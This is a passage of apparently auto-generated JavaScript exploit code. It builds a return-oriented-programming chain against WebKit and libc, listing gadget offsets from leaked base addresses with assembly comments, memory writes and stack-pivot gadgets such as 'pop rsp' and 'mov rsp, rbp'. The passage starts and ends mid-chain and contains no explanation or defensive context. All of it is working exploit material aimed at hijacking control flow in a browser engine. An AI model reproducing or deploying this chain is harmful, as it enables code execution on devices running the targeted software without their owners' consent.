webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1532:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+124720, //L1534
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1534:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+124776, //L1536
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1536:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1538:
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+124928, //L1540
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1539:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1540:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+125032, //L1543
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+125016, //L1542
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1542:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1543:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+125176, //L1547
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+125144, //L1545
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+125160, //L1546
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+125248, //L1548
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1548:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+125304, //L1550
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1550:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+125416, //L1554
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1552:
db([34, 0]); // 0x22
set_gadget(libc_base+772328,); //pop rcx
//L1553:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1554:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+125496, //L1555
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+125512, //L1556
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+125600, //L1557
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1557:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+125656, //L1559
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1559:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+125728, //L1561
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1561:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+125784, //L1563
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1563:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1565:
libc_base+489696, //pop rsp
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+125936, //L1567
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1566:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1567:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+126040, //L1570
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+126024, //L1569
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1569:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1570:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+126184, //L1574
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+126152, //L1572
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+126168, //L1573
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+126256, //L1575
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1575:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+126312, //L1577
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1577:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+126424, //L1581
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1579:
db([35, 0]); // 0x23
set_gadget(libc_base+772328,); //pop rcx
//L1580:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1581:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+126504, //L1582
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+126520, //L1583
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+126608, //L1584
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1584:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+126664, //L1586
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1586:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+126736, //L1588
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+126792, //L1590
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1590:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+126896, //L1593
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1592:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+127000, //L1596
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+126984, //L1595
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1595:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+127144, //L1600
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+127112, //L1598
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+127128, //L1599
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+127240, //L1602
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1601:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1602:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+127344, //L1605
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+127328, //L1604
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1604:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+127488, //L1609
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+127456, //L1607
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+127472, //L1608
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+127560, //L1610
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1610:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+127616, //L1612
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1612:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+127728, //L1616
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1614:
db([36, 0]); // 0x24
set_gadget(libc_base+772328,); //pop rcx
//L1615:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1616:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+127808, //L1617
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+127824, //L1618
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+127912, //L1619
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1619:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+127968, //L1621
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1621:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+128040, //L1623
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1623:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+128096, //L1625
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1625:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1627:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+128248, //L1629
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1628:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+128352, //L1632
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+128336, //L1631
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1631:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1632:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+128496, //L1636
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+128464, //L1634
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+128480, //L1635
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+128568, //L1637
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1637:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+128624, //L1639
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1639:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+128736, //L1643
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1641:
db([37, 0]); // 0x25
set_gadget(libc_base+772328,); //pop rcx
//L1642:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1643:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+128816, //L1644
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+128832, //L1645
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+128920, //L1646
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1646:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+128976, //L1648
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1648:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+129048, //L1650
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1650:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+129104, //L1652
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1652:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1654:
libc_base+765209, //mov rsp, rbp ; pop rbp
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+129256, //L1656
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1655:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+129360, //L1659
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+129344, //L1658
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1658:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1659:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+129504, //L1663
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+129472, //L1661
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+129488, //L1662
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+129576, //L1664
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+129632, //L1666
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1666:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+129744, //L1670
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1668:
db([38, 0]); // 0x26
set_gadget(libc_base+772328,); //pop rcx
//L1669:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1670:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+129824, //L1671
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+129840, //L1672
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+129928, //L1673
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+129984, //L1675
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1675:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+130056, //L1677
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1677:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+130112, //L1679
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1679:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+130240, //L1682
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+130224, //L1681
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+130344, //L1683
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+130360, //L1684
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+130480, //L1685
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+130464, //L1686
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
